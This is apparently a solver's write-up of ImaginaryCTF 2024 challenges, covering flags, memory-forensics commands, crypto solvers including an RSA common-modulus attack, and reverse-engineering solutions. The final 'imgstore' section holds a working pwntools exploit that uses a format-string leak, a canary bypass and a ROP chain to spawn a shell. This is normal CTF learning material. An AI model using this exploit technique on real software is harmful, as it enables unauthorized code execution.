# Imaginary CTF 2024

## sanity-check (100 pts) - 1245 solves
* Description
  Welcome to ImaginaryCTF 2024!

* Attachments
  ictf{this_isnt_real}

## discord (100 pts) - 1027 solves

https://canary.discord.com/channels/732308165265326080/1262522411123736718/1262528560904667239

ictf{fake_flag_for_testing}

## starship (100 pts) - 205 solves

```bash
~/dc/ctf/imaginary/misc$nc starship.chal.imaginaryctf.org 1337
== proof-of-work: disabled ==
<[ missle defense system control panel ]>
1. show dataset
2. train model
3. predict state
4. check incoming objects
initializing...
> 4
target 1: 97,87,18,26,17,37,27,24,48 | result: enemy
target 2: 59,50,57,43,4,27,22,-14,50 | result: enemy
> 42
enter data: 59,50,57,43,4,27,22,-14,50,friendly
> 2
model trained!
> 4
target 1: 97,87,18,26,17,37,27,24,48 | result: friendly
target 2: 59,50,57,43,4,27,22,-14,50 | result: friendly
flag: ictf{m1ssion_succ3ss_8fac91385b77b026}
```

## readme (100 pts) - 978 solves

```bash
~/dc/ctf/imaginary/web/readme$cat Dockerfile 
FROM node:20-bookworm-slim

RUN apt-get update \
    && apt-get install -y nginx tini \
    && apt-get clean \
    && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

WORKDIR /app
COPY package.json yarn.lock ./
RUN yarn install --frozen-lockfile
COPY src ./src
COPY public ./public

COPY default.conf /etc/nginx/sites-available/default
COPY start.sh /start.sh

ENV FLAG="ictf{path_normalization_to_the_rescue}"

ENTRYPOINT ["/usr/bin/tini", "--"]
CMD ["/start.sh"]
```

## bom (100 pts) - 882 solves

```bash
~/dc/ctf/imaginary/fore$cat chal.txt 
��ictf{th4t_isn7_chin3se}
```

## packed (100 pts) - 605 solves

```bash
~/dc/ctf/imaginary/fore$file routed.pkz
routed.pkz: Zip archive data, at least v2.0 to extract, compression method=deflate
~/dc/ctf/imaginary/fore$unzip routed.pkz
```
![secret](https://hackmd.io/_uploads/B1kU7ba_A.png)

## cartesian-1 (100 pts) - 550 solves
https://www.instagram.com/stories/highlights/18437746888049094/
![image](https://hackmd.io/_uploads/SkEAmZadR.png)

## dog-mom (100 pts) - 271 solves

https://maps.app.goo.gl/ThaxFTJtf8qyqrx69

## crash (100 pts) - 215 solves

```bash
#1970 0xc60c81c70ce0  \Users\imaginarypc\Documents\flag.txt 216 
sudo vol -f dump.vmem windows.dumpfiles --virtaddr 0xc60c81c70ce0
mv file.0xc60c81c70ce0.0xc60c83b5e650.DataSectionObject.flag.txt.dat flag.txt
sudo base64 -d flag.txt
ictf{aa0eb707a41b2ca6}
```

## base64 (100 pts) - 777 solves

chall
```python
from Crypto.Util.number import bytes_to_long

q = 64

flag = open("flag.txt", "rb").read()
flag_int = bytes_to_long(flag)

secret_key = []
while flag_int:
    secret_key.append(flag_int % q)
    flag_int //= q

print(f"{secret_key = }")
```
solver
```python
from Crypto.Util.number import long_to_bytes

q = 64

secret_key = [10, 52, 23, 14, 52, 16, 3, 14, 37, 37, 3, 25, 50, 32, 19, 14, 48, 32, 35, 13, 54, 12, 35, 12, 31, 29, 7, 29, 38, 61, 37, 27, 47, 5, 51, 28, 50, 13, 35, 29, 46, 1, 51, 24, 31, 21, 54, 28, 52, 8, 54, 30, 38, 17, 55, 24, 41, 1]

flag = 0

for v in reversed(secret_key):
    flag = flag * q + v

print(long_to_bytes(flag).decode())

#$python3 solve.py 
#ictf{b4se_c0nv3rs1on_ftw_236680982d9e8449}
```

## integrity (100 pts) - 172 solves

chall
```python
from Crypto.Util.number import *
from binascii import crc_hqx

p = getPrime(1024)
q = getPrime(1024)

n = p*q
e = 65537
tot = (p-1)*(q-1)
d = pow(e, -1, tot)

flag = bytes_to_long(open("flag.txt", "rb").read())
ct = pow(flag, e, n)

#signature = pow(flag, d, n) # no, im not gonna do that
signature = pow(flag, crc_hqx(long_to_bytes(d), 42), n)

print(f"{n = }")
print(f"{ct = }")
print(f"{signature = }")
```
[common modulus attack](https://qiita.com/motimotipurinn/items/85d177282fa12da8cc20)
solver
```python
from typing import Tuple
from Crypto.Util.number import long_to_bytes
from binascii import crc_hqx
import sys
sys.setrecursionlimit(10000)

def excGCD(a: int, b: int) -> Tuple[int, int, int]:
    if b == 0:
        return a, 1, 0
    d, x1, y1 = excGCD(b, a % b)
    x = y1
    y = x1 - (a // b) * y1
    return d, x, y

def modinv(a: int, m: int) -> int:
    g, x, _ = excGCD(a, m)
    if g != 1:
        raise ValueError('No modular inverse')
    return x % m

def Common_Modulus_Attack(N: int, e_1: int, c_1: int, e_2: int, c_2: int) -> int:
    d, s_1, s_2 = excGCD(e_1, e_2)
    if s_1 < 0:
        c_1 = modinv(c_1, N)
        s_1 = -s_1
    if s_2 < 0:
        c_2 = modinv(c_2, N)
        s_2 = -s_2
    return (pow(c_1, s_1, N) * pow(c_2, s_2, N)) % N

e_1 = 65537
N = 10564138776494961592014999649037456550575382342808603854749436027195501416732462075688995673939606183123561300630136824493064895936898026009104455605012656112227514866064565891419378050994219942479391748895230609700734689313646635542548646360048189895973084184133523557171393285803689091414097848899969143402526024074373298517865298596472709363144493360685098579242747286374667924925824418993057439374115204031395552316508548814416927671149296240291698782267318342722947218349127747750102113632548814928601458613079803549610741586798881477552743114563683288557678332273321812700473448697037721641398720563971130513427
c_1 = 5685838967285159794461558605064371935808577614537313517284872621759307511347345423871842021807700909863051421914284950799996213898176050217224786145143140975344971261417973880450295037249939267766501584938352751867637557804915469126317036843468486184370942095487311164578774645833237405496719950503828620690989386907444502047313980230616203027489995981547158652987398852111476068995568458186611338656551345081778531948372680570310816660042320141526741353831184185543912246698661338162113076490444675190068440073174561918199812094602565237320537343578057719268260605714741395310334777911253328561527664394607785811735
c_2 = 1275844821761484983821340844185575393419792337993640612766980471786977428905226540853335720384123385452029977656072418163973282187758615881752669563780394774633730989087558776171213164303749873793794423254467399925071664163215290516803252776553092090878851242467651143197066297392861056333834850421091466941338571527809879833005764896187139966615733057849199417410243212949781433565368562991243818187206912462908282367755241374542822443478131348101833178421826523712810049110209083887706516764828471192354631913614281317137232427617291828563280573927573115346417103439835614082100305586578385614623425362545483289428
for i in range(N):
    m = Common_Modulus_Attack(N, e_1, c_1,crc_hqx(long_to_bytes(i+65537), 42), c_2)
    if(b'ictf' in long_to_bytes(m)):
        break
print(m)
print(long_to_bytes(m))
```

## unoriginal (100 pts) - 710 solves

```plain text
000011c9  int32_t main(int32_t argc, char** argv, char** envp)

000011d5      void* fsbase
000011d5      int64_t rax = *(fsbase + 0x28)
000011f3      printf(format: "Enter your flag here: ")
00001204      void buf
00001204      gets(buf: &buf)
00001232      for (int32_t i = 0; i s<= 0x2f; i = i + 1)
00001226          *(&buf + sx.q(i)) = *(&buf + sx.q(i)) ^ 5
0000124c      if (strcmp(&buf, "lfqc~opvqZdkjqm`wZcidbZfm`fn`wZd…") != 0)
0000126e          puts(str: "Incorrect.")
0000124c      else
00001258          puts(str: "Correct!")
0000127c      *(fsbase + 0x28)
00001285      if (rax == *(fsbase + 0x28))
0000128d          return 0
00001287      __stack_chk_fail()
00001287      noreturn
```

```cpp
#include<stdio.h>
#include<string.h>

int main(void){
    char xorstr[] = "lfqc~opvqZdkjqm`wZcidbZfm`fn`wZd6130a0`0``761gdx";
    for(int i  = 0;i < strlen(xorstr);i++){
        printf("%c",xorstr[i]^5);
    }
    printf("\n");
}
```

## Rust (100 pts) - 96 solves

```rust
void rust::main(void)
{
  std::io::stdio::_print((size_t)local_128);
  local_f0 = std::io::stdio::stdout();
  local_f8 = <>::flush(&local_f0);
  core::ptr::drop_in_place<>(&local_f8);
  alloc::string::String::new(local_e8);
                    /* try { // try from 0010a5a7 to 0010a5af has its CatchHandler @ 0010a5c9 */
  local_c0 = (int *)std::io::stdio::stdin();
                    /* try { // try from 0010a5ec to 0010a6a9 has its CatchHandler @ 0010a5c9 */
  std::io::stdio::Stdin::read_line(local_d0,&local_c0,local_e8);
  core::ptr::drop_in_place<>(local_d0);
  core::fmt::Arguments::new_const(local_b8,&PTR_s_Enter_the_key_(in_hex):_/build/r_00162060,1);
  std::io::stdio::_print((size_t)local_b8);
  local_80 = std::io::stdio::stdout();
  local_88 = <>::flush(&local_80);
  core::ptr::drop_in_place<>(&local_88);
  alloc::string::String::new(local_78);
                    /* try { // try from 0010a6ac to 0010a6b4 has its CatchHandler @ 0010a6ce */
  local_50 = (int *)std::io::stdio::stdin();
                    /* try { // try from 0010a6f1 to 0010a80e has its CatchHandler @ 0010a6ce */
  std::io::stdio::Stdin::read_line(local_60,&local_50,local_78);
  core::ptr::drop_in_place<>(local_60);
  auVar1 = <>::deref();
  local_48 = core::str::<impl_str>::trim(auVar1._0_8_,auVar1._8_8_);
  auVar1 = <>::deref();
  auVar1 = core::str::<impl_str>::trim(auVar1._0_8_,auVar1._8_8_);
  core::num::<impl_u128>::from_str_radix(local_38,auVar1._0_8_,auVar1._8_8_,0x10);
  local_10 = core::result::Result<T,E>::unwrap_or_default(local_38);
  encrypt((char *)local_48._0_8_,local_48._8_4_);
                    /* try { // try from 0010a811 to 0010a81d has its CatchHandler @ 0010a5c9 */
  core::ptr::drop_in_place<>(local_78);
  core::ptr::drop_in_place<>(local_e8);
  return;
}


/* rust::encrypt */

void rust::encrypt(char *__block,int __edflag)

{
  
  local_b8 = __block;
  local_b0 = CONCAT44(in_register_00000034,__edflag);
  uVar1 = core::str::<impl_str>::len();
  alloc::vec::Vec<T>::with_capacity((undefined (*) [16])local_138,uVar1);
                    /* try { // try from 0010a1bc to 0010a1c0 has its CatchHandler @ 0010a1e5 */
  core::str::<impl_str>::bytes((long)__block,CONCAT44(in_register_00000034,__edflag));
                    /* try { // try from 0010a1fb to 0010a390 has its CatchHandler @ 0010a1e5 */
  local_120._0_16_ = <>::into_iter();
  while( true ) {
    auVar3 = <>::next((long *)local_120);
    local_109 = auVar3[8];
    local_10a = auVar3[0];
    if ((auVar3 & (undefined  [16])0x1) == (undefined  [16])0x0) {
      local_d8 = local_138;
      local_8 = <>::fmt;
      local_18 = <>::fmt;
      local_d0 = <>::fmt;
      local_20 = local_d8;
      local_10 = local_d8;
      core::fmt::Arguments::new_v1(local_108,&DAT_00162000,2,&local_d8,1);
      std::io::stdio::_print((size_t)local_108);
      local_c0 = std::io::stdio::stdout();
      local_c8 = <>::flush(&local_c0);
      core::ptr::drop_in_place<>(&local_c8);
      core::ptr::drop_in_place<>(local_138);
      return;
    }
    local_78 = 0;
    local_80 = (ulong)local_109 << 5;
    local_70 = local_80 >> 3;
    local_68 = 0;
    local_60 = in_RDX ^ local_70;
    uVar2 = local_60 + 0x539;
    uVar1 = in_RCX + (0xfffffffffffffac6 < local_60);
    local_81 = local_109;
    if (SCARRY8(in_RCX,0) != SCARRY8(in_RCX,(ulong)(0xfffffffffffffac6 < local_60))) break;
    local_40 = ~uVar2;
    local_38 = ~uVar1;
    local_50 = uVar2;
    local_48 = uVar1;
    if (CARRY8(in_RCX,in_RCX) || CARRY8(in_RCX * 2,(ulong)CARRY8(in_RDX,in_RDX))) {
      core::panicking::panic
                ("attempt to multiply with overflowEnter the message:Enter the key (in hex): /build/ rustc-kAv1jW/rustc-1.75.0+dfsg0ubuntu1~bpo0/library/core/src/alloc/layout.rs"
                 ,0x21,&DAT_00162038);
      goto LAB_0010a4be;
    }
    local_30 = in_RDX * 2;
    local_28 = in_RCX * 2 + (ulong)CARRY8(in_RDX,in_RDX);
    alloc::vec::Vec<T,A>::push(local_138,local_40,local_38);
  }
                    /* try { // try from 0010a4a0 to 0010a50e has its CatchHandler @ 0010a1e5 */
  core::panicking::panic("attempt to add with overflow",0x1c,&DAT_00162020);
LAB_0010a4be:
  do {
    invalidInstructionException();
  } while( true );
}


```

solver
```rust
fn main() {
    let enc:[i128;21] = [-42148619422891531582255418903, -42148619422891531582255418927, -42148619422891531582255418851, -42148619422891531582255418907, -42148619422891531582255418831, -42148619422891531582255418859, -42148619422891531582255418855, -42148619422891531582255419111, -42148619422891531582255419103, -42148619422891531582255418687, -42148619422891531582255418859, -42148619422891531582255419119, -42148619422891531582255418843, -42148619422891531582255418687, -42148619422891531582255419103, -42148619422891531582255418907, -42148619422891531582255419107, -42148619422891531582255418915, -42148619422891531582255419119, -42148619422891531582255418935, -42148619422891531582255418823];
    let mut flag = String::new();
    let key = ((!enc[0]) - 0x539) ^ (('i' as i128) << 2);
    println!("key: {}",key);

    for &i in &enc {
        let dec = (((!i) - 0x539) ^ key)  >> 2;
        flag.push(dec as u8 as char)
    }
    println!("flag: {}",flag);
}
```

## imgstore (100 pts) - 136 solves

Format string vulnerability in the function, "sub_1e2a"(sell books)
Set data_6050 to pass here.
```cpp
if ((buf * 0x13f5c223) == data_6050)
```
```cpp
int64_t sub_1e2a()

{
    void* fsbase;
    int64_t rax = *(uint64_t*)((char*)fsbase + 0x28);
    int32_t fd = open("/dev/urandom", 0);
    uint32_t buf;
    read(fd, &buf, 4);
    close(fd);
    buf = ((uint32_t)((int16_t)buf));
    char i;
    do
    {
        printf("Enter book title: ");
        void var_58;
        fgets(&var_58, 0x32, stdin);
        printf("Book title --> ");
        printf(&var_58); //<-Format string vulnerability
        puts(&data_3008);
        if ((buf * 0x13f5c223) == data_6050)
        {
            data_608c = 2;
            sub_1d77(data_608c);
        }
        puts("Sorry, we already have the same …");
        printf("Still interested in selling your…");
        __isoc99_scanf(&data_38a7, &i);
        getchar();
    } while (i == 0x79);
    puts(&data_3008);
    printf("%s[-] Exiting program..%s\n", "\x1b[31m", "\x1b[0m");
    sleep(1);
    int64_t rax_17 = (rax ^ *(uint64_t*)((char*)fsbase + 0x28));
    if (rax_17 == 0)
    {
        return rax_17;
    }
    __stack_chk_fail();
    /* no return */
}
```
```cpp
int64_t sub_1d77(int32_t arg1)

{
    void* fsbase;
    int64_t rax = *(uint64_t*)((char*)fsbase + 0x28);
    sub_18f2();
    if (arg1 != 2)
    {
        printf("%s[!] SECURITY BREACH DETECTED%s…", "\x1b[41m", "\x1b[0m");
        puts("[+] BAD HACKER!!");
    }
    else
    {
        printf("%s[/] UNDER DEVELOPMENT %s\n", "\x1b[44m", "\x1b[0m");
        putchar(0x3e);
        void buf;
        fgets(&buf, 0xa0, stdin); //<-Buffer over flow
    }
    int64_t rax_5 = (rax ^ *(uint64_t*)((char*)fsbase + 0x28));
    if (rax_5 == 0)
    {
        return rax_5;
    }
    __stack_chk_fail();
    /* no return */
}
```
LIBC LEAK
```console
────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────
 ► 0x555555555ecd    call   printf@plt                <printf@plt>
        format: 0x7fffffffda20 ◂— 'AAAA/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx\n'
        vararg: 0x7fffffffb370 ◂— 'Book title --> e: '
 
   0x555555555ed2    lea    rdi, [rip + 0x112f]
   0x555555555ed9    call   puts@plt                <puts@plt>
 
   0x555555555ede    mov    eax, dword ptr [rbp - 0x58]
   0x555555555ee1    imul   eax, eax, 0x13f5c223
   0x555555555ee7    mov    edx, dword ptr [rip + 0x4163]
   0x555555555eed    cmp    eax, edx
   0x555555555eef    jne    0x555555555f08                <0x555555555f08>
 
   0x555555555ef1    mov    dword ptr [rip + 0x4191], 2
   0x555555555efb    mov    eax, dword ptr [rip + 0x418b]
   0x555555555f01    mov    edi, eax
──────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffda10 —▸ 0x55555555a060 —▸ 0x7ffff7fc26a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
01:0008│-058 0x7fffffffda18 ◂— 0x300001c03
02:0010│ rdi 0x7fffffffda20 ◂— 'AAAA/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx\n'
03:0018│-048 0x7fffffffda28 ◂— '/%lx/%lx/%lx/%lx/%lx/%lx/%lx\n'
... ↓        2 skipped
06:0030│-030 0x7fffffffda40 ◂— 0xa786c252f /* '/%lx\n' */
07:0038│-028 0x7fffffffda48 —▸ 0x7ffff7e5959a (puts+378) ◂— cmp eax, -1
────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────
 ► 0   0x555555555ecd
   1   0x5555555561b8
   2   0x5555555562a3
   3   0x7ffff7df9083 __libc_start_main+243
   4   0x5555555552ae
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x/16x 0x7fffffffda20
0x7fffffffda20: 0x41414141      0x786c252f      0x786c252f      0x786c252f
0x7fffffffda30: 0x786c252f      0x786c252f      0x786c252f      0x786c252f
0x7fffffffda40: 0x786c252f      0x0000000a      0xf7e5959a      0x00007fff <- LIBC LEAK (LIBC BASE + 0x8459a)
0x7fffffffda50: 0x555562b0      0x00005555      0xffffda90      0x00007fff
0x7fffffffda60: 0x555562b0      0x00005555      0x29bead00      0xb4611729 <- CANARY
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
    0x555555554000     0x555555555000 r--p     1000      0 /home/tsuneki/dc/ctf/imaginary/pwn/imagestore/imgstore
    0x555555555000     0x555555557000 r-xp     2000   1000 /home/tsuneki/dc/ctf/imaginary/pwn/imagestore/imgstore
    0x555555557000     0x555555558000 r--p     1000   3000 /home/tsuneki/dc/ctf/imaginary/pwn/imagestore/imgstore
    0x555555559000     0x55555555a000 r--p     1000   4000 /home/tsuneki/dc/ctf/imaginary/pwn/imagestore/imgstore
    0x55555555a000     0x55555555d000 rw-p     3000   5000 /home/tsuneki/dc/ctf/imaginary/pwn/imagestore/imgstore
    0x7ffff7dd5000     0x7ffff7df7000 r--p    22000      0 /home/tsuneki/dc/ctf/imaginary/pwn/imagestore/libc.so.6
    0x7ffff7df7000     0x7ffff7f6f000 r-xp   178000  22000 /home/tsuneki/dc/ctf/imaginary/pwn/imagestore/libc.so.6
    0x7ffff7f6f000     0x7ffff7fbd000 r--p    4e000 19a000 /home/tsuneki/dc/ctf/imaginary/pwn/imagestore/libc.so.6
    0x7ffff7fbd000     0x7ffff7fc1000 r--p     4000 1e7000 /home/tsuneki/dc/ctf/imaginary/pwn/imagestore/libc.so.6
    0x7ffff7fc1000     0x7ffff7fc3000 rw-p     2000 1eb000 /home/tsuneki/dc/ctf/imaginary/pwn/imagestore/libc.so.6
```
FIND buf
```console
────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────
 ► 0x555555555ecd    call   printf@plt                <printf@plt>
        format: 0x7fffffffda20 ◂— 0xa64243725 /* '%7$d\n' */
        vararg: 0x7fffffffb370 ◂— 'Book title --> e: '
 
   0x555555555ed2    lea    rdi, [rip + 0x112f]
   0x555555555ed9    call   puts@plt                <puts@plt>
 
   0x555555555ede    mov    eax, dword ptr [rbp - 0x58]
   0x555555555ee1    imul   eax, eax, 0x13f5c223
   0x555555555ee7    mov    edx, dword ptr [rip + 0x4163]
   0x555555555eed    cmp    eax, edx
   0x555555555eef    jne    0x555555555f08                <0x555555555f08>
 
   0x555555555ef1    mov    dword ptr [rip + 0x4191], 2
   0x555555555efb    mov    eax, dword ptr [rip + 0x418b]
   0x555555555f01    mov    edi, eax
─────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffda10 —▸ 0x55555555a060 —▸ 0x7ffff7fc26a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
01:0008│-058 0x7fffffffda18 ◂— 0x30000fca1
02:0010│ rdi 0x7fffffffda20 ◂— 0xa64243725 /* '%7$d\n' */
03:0018│-048 0x7fffffffda28 —▸ 0x7ffff7e65e93 (_IO_file_overflow+275) ◂— cmp eax, -1
04:0020│-040 0x7fffffffda30 ◂— 0x0
05:0028│-038 0x7fffffffda38 —▸ 0x7ffff7fc26a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
06:0030│-030 0x7fffffffda40 —▸ 0x555555557008 ◂— 0x6d305b1b00
07:0038│-028 0x7fffffffda48 —▸ 0x7ffff7e5959a (puts+378) ◂— cmp eax, -1
───────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────
 ► 0   0x555555555ecd
   1   0x5555555561b8
   2   0x5555555562a3
   3   0x7ffff7df9083 __libc_start_main+243
   4   0x5555555552ae
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x/16x 0x7fffffffda10
0x7fffffffda10: 0x5555a060      0x00005555      0x0000fca1 <-buf 0x00000003
0x7fffffffda20: 0x64243725      0x0000000a      0xf7e65e93       0x00007fff
0x7fffffffda30: 0x00000000      0x00000000      0xf7fc26a0       0x00007fff
0x7fffffffda40: 0x55557008      0x00005555      0xf7e5959a       0x00007fff
```
solver
```python
from pwn import *

e = ELF("./imgstore")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
context.binary = e

p = e.process()
p.recvuntil(b">> ")
p.sendline(b"3")
p.sendline(b"%6$lx %7$d %13$lx %17$lx")
p.recvuntil(b"Book title --> ")
res = p.recvline().decode().replace('\n','')
res = res.split(" ")
elf_leak = res[0]
buff_leak = res[1]
libc_address_leak = res[2]
canary = res[3]
e.address = int(elf_leak,16) - 0x6060
print(f"ELF BASE ::: {hex(e.address)}")
libc.address = int(libc_address_leak,16) - 0x8459a
print(f"LIBC BASE :: {hex(libc.address)}")
print(f"CANARY ::::: {canary}")
buf = int(buff_leak) * 0x13f5c223
p.sendline(b'y')
sleep(1)
p.sendline(fmtstr_payload(8, {(e.address+0x6050): buf&0xffffffff},write_size="short"))
sleep(1)
rop = ROP(libc,base=libc.address)
rop.raw(b"A"*104)
rop.raw(p64(int(canary,16)))
rop.raw(p64(0xdeadbeaf))
rop.raw(p64(rop.search(move=4)[0]))
rop.raw(p64(rop.rdi[0]))
rop.raw(p64(next(libc.search(b'/bin/sh'))))
rop.call('system')
p.sendline(rop.chain())

p.interactive()    

```
